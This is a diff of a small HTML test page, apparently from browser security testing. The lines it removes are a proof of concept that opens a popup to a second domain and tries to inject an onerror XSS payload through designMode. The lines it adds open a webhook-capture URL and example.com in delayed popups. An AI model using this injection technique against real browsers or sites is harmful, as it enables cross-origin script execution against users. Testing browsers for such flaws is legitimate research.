@@ -1,36 +1,12 @@
+<!DOCTYPE html>
 <html>
-<head>
-<title>test</title>
-</head>
 <body>
-
-<p>designMode test</p>
-<button onclick="go()">click here</button>
-<p id="h"></p>
-
+<button onclick="test()">KLIK 1X</button>
 <script>
-var win;
-function go(){
-  document.getElementById('h').innerText = 'opening second domain...';
-
-  // buka domain kedua
-  win = window.open('https://download-bypass.netlify.app/', '_blank');
-
-  setTimeout(function(){
-    document.getElementById('h').innerText = 'BYPASS! trying designMode inject...';
-    document.title = 'BYPASS!';
-
-    try {
-      // coba aktifin designMode di popup domain kedua
-      win.document.designMode = 'on';
-      win.document.execCommand('insertHTML', false, '<h1>BYPASS! injected</h1><img src=x onerror=alert("UXSS domain=" + document.domain)>');
-      document.getElementById('h').innerText = 'BYPASS! inject sent, check second tab';
-    } catch(e) {
-      document.getElementById('h').innerText = 'blocked: ' + e;
-    }
-  }, 1000);
+function test(){
+  setTimeout(()=>{ window.open(" https://webhooksite.net/fde0f1d7-31ad-402e-84c2-864b09420762?popup=1"); }, 1000);
+  setTimeout(()=>{ window.open("https://example.com?popup=2"); }, 1000);
 }
 </script>
-
 </body>
 </html>
